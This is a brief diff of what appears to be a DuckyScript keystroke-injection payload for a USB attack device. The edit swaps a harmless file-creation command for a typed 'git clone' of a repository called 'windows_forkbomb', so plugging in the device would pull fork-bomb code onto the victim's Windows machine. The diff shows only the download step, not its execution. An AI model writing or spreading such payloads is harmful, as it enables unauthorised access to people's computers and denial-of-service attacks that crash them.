@@ -9,7 +9,7 @@ ENTER
 
 REM Making file
 
-STRING New-Item -Path "C:\Logs\fun.txt" -ItemType File
+STRING git clone https://github.com/nrobillard/windows_forkbomb.git
 ENTER
 
 
